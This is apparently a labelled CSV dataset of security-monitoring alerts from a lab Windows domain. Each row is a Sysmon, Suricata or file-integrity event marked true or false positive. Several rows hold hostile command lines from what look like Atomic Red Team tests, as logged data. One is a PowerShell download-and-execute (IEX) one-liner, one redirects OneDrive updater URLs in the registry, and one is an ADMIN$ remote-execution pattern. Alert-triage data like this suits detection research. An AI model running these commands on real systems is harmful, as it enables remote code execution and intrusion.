text,label,label_name
"Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe 3 Low Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe 92307 sysmon sysmon_eid13_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\services.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-07-04 20:41:00.776
ProcessGuid: {ff3427f9-1e68-6868-0b00-000000001400}
ProcessId: 904
Image: C:\WINDOWS\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath
Details: %%SystemRoot%%\PSEXESVC.exe
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client findstr  \""Active Disc\"" C:\\WINDOWS\\system32\\cmd.exe /c qwinsta /server:localhost | findstr \""Active Disc\"" C:\\Windows\\System32\\findstr.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.663
ProcessGuid: {ff3427f9-2281-6869-9a01-000000001500}
ProcessId: 7812
Image: C:\Windows\System32\findstr.exe
FileVersion: 10.0.26100.1150 (WinBuild.160101.0800)
Description: Find String (QGREP) Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: FINDSTR.EXE
CommandLine: findstr  ""Active Disc""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=14188B880D4410EAF7168FB629FD6FB59BEA3DAC,MD5=E43DE137E75349CACF2760ABFC338340,SHA256=46BDB9125C43BD3F63C233A7B0D021B04E867C4D19B72DDBCF6E5F2A392014D3,IMPHASH=FAF6C2ABBD03B51B5852A294EAAFC7CE
ParentProcessGuid: {ff3427f9-2281-6869-9801-000000001500}
ParentProcessId: 2484
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\WINDOWS\system32\cmd.exe /c qwinsta /server:localhost | findstr ""Active Disc""
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Detected WinRM activity from 0:0:0:0:0:0:0:1 to 0:0:0:0:0:0:0:1 4 Low Detected WinRM activity from 0:0:0:0:0:0:0:1 to 0:0:0:0:0:0:0:1 92110 sysmon sysmon_eid3_detections windows windows_eventchannel Win11Client System NT AUTHORITY\\SYSTEM ""Network connection detected:
RuleName: technique_id=T1021.006,technique_name=Windows Remote Management
UtcTime: 2025-07-04 17:27:10.519
ProcessGuid: {ff3427f9-f4ae-6867-eb03-000000000000}
ProcessId: 4
Image: System
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: false
SourceIsIpv6: true
SourceIp: 0:0:0:0:0:0:0:1
SourceHostname: -
SourcePort: 50121
SourcePortName: -
DestinationIsIpv6: true
DestinationIp: 0:0:0:0:0:0:0:1
DestinationHostname: -
DestinationPort: 5985
DestinationPortName: -"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
Suricata: Alert - ET INFO Packed Executable Download 3 Low Suricata: Alert - ET INFO Packed Executable Download 86601 ids suricata json Suricata /var/log/suricata/eve.json,0,FP
"Possible COM Hijacking evidence found in registry under HKLM\\SOFTWARE\\Microsoft\\MsixRegistryCompatibility\\Package\\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\\User\\SOFTWARE\\Classes\\CLSID\\{D3E34B21-9D75-101A-8C3D-00AA001A1652}\\LocalServer32\\ServerExecutable binary is: C:\\Program Files\\WindowsApps\\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\\PaintApp\\mspaint.exe 3 Low Possible COM Hijacking evidence found in registry under HKLM\\SOFTWARE\\Microsoft\\MsixRegistryCompatibility\\Package\\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\\User\\SOFTWARE\\Classes\\CLSID\\{D3E34B21-9D75-101A-8C3D-00AA001A1652}\\LocalServer32\\ServerExecutable binary is: C:\\Program Files\\WindowsApps\\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\\PaintApp\\mspaint.exe 92308 sysmon sysmon_eid13_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\svchost.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: technique_id=T1546.015,technique_name=Component Object Model Hijacking
EventType: SetValue
UtcTime: 2025-06-29 12:14:03.710
ProcessGuid: {ff3427f9-2d6d-6861-c301-000000001000}
ProcessId: 4740
Image: C:\WINDOWS\system32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\MsixRegistryCompatibility\Package\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\User\SOFTWARE\Classes\CLSID\{D3E34B21-9D75-101A-8C3D-00AA001A1652}\LocalServer32\ServerExecutable
Details: C:\Program Files\WindowsApps\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\PaintApp\mspaint.exe
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c powershell.exe -exec bypass -noprofile \""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"" \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:24:19.085
ProcessGuid: {ff3427f9-3873-6868-bb02-000000001400}
ProcessId: 10000
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Executable file dropped in folder commonly used by malware 15 Critical Executable file dropped in folder commonly used by malware 92213 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe C:\\Users\\snell\\AppData\\Local\\Temp\\chrome_Unpacker_BeginUnzipping9076_1974459208\\v1FieldTypes.json SOCLAB\\snell ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-07-03 08:16:54.257
ProcessGuid: {ff3427f9-3c13-6866-5a01-000000001200}
ProcessId: 9076
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
TargetFilename: C:\Users\snell\AppData\Local\Temp\chrome_Unpacker_BeginUnzipping9076_1974459208\v1FieldTypes.json
CreationUtcTime: 2025-07-03 08:16:54.257
User: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {if (-not (Test-Path \\\""\""C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\\\""\"")) {     Write-Host \\\""\""OneDriveStandaloneUpdater.exe not found at C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe. Test cannot continue.\\\""\""     exit 1 }  New-Item -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Force | Out-Null Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""UpdateRingSettingURLFromOC\\\""\"" -Value \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\""\"" -Type String -Force Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""ODSUUpdateXMLUrlFromOC\\\""\"" -Value \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\""\"" -Type String -Force Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""UpdateXMLUrlFromOC\\\""\"" -Value \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\""\"" -Type String -Force Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""UpdateOfficeConfigTimestamp\\\""\"" -Value 99999999999 -Type QWord -Force  # Run OneDrive Standalone Updater &amp; \\\""\""C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\\\""\""} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 21:51:32.108
ProcessGuid: {ff3427f9-4ce4-6868-6706-000000001400}
ProcessId: 6876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {if (-not (Test-Path \""""C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe\"""")) {
    Write-Host \""""OneDriveStandaloneUpdater.exe not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe. Test cannot continue.\""""
    exit 1
}

New-Item -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Force | Out-Null
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""UpdateRingSettingURLFromOC\"""" -Value \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""" -Type String -Force
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""ODSUUpdateXMLUrlFromOC\"""" -Value \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""" -Type String -Force
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""UpdateXMLUrlFromOC\"""" -Value \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""" -Type String -Force
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""UpdateOfficeConfigTimestamp\"""" -Value 99999999999 -Type QWord -Force

# Run OneDrive Standalone Updater
& \""""C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe\""""}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"File added to the system. 5 Low File added to the system. 554 ossec syscheck syscheck_entry_added syscheck_file syscheck_new_entry Linux-Server File '/home/vboxuser/f5auto-bigip-ve-bgp-ecmp-local/tf/terraform.tfstate' added
Mode: realtime
 syscheck",0,FP
"Registry Value Integrity Checksum Changed 5 Low Registry Value Integrity Checksum Changed 750 ossec syscheck syscheck_entry_modified syscheck_registry syscheck_registry_value_modified WinSrv2019 Registry Value '[x32] HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinDefend\FailureActions' modified
Mode: scheduled
Changed attributes: md5,sha1,sha256
Old md5sum was: 'bda7dde915185558a7c8bac98a1a57b3'
New md5sum is : '81320f6a3736b06676c1d3f90268a2ed'
Old sha1sum was: '7115db0c210cd89370b0daed48f7ffef5c052ab7'
New sha1sum is : 'db19f062229c774b555cc8c78b210f5ec25dd706'
Old sha256sum was: 'd8242ffec082a5744c29f4a270133ab1abdc9a7678eaa02ae75e7e5dd99a21d7'
New sha256sum is : '930d588221158857e0fa645dd4c84446cf7fc0c90e8a703296e594ec30a5af0d'
 syscheck",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c cmd.exe /Q /c hostname 1&gt; \\\\127.0.0.1\\ADMIN$\\output.txt 2&gt;&amp;1 \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-06 13:51:16.152
ProcessGuid: {ff3427f9-7f54-686a-0d06-000000001600}
ProcessId: 6744
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}
LogonId: 0x23BE8D1
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-60b8-686a-0404-000000001600}
ParentProcessId: 6808
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
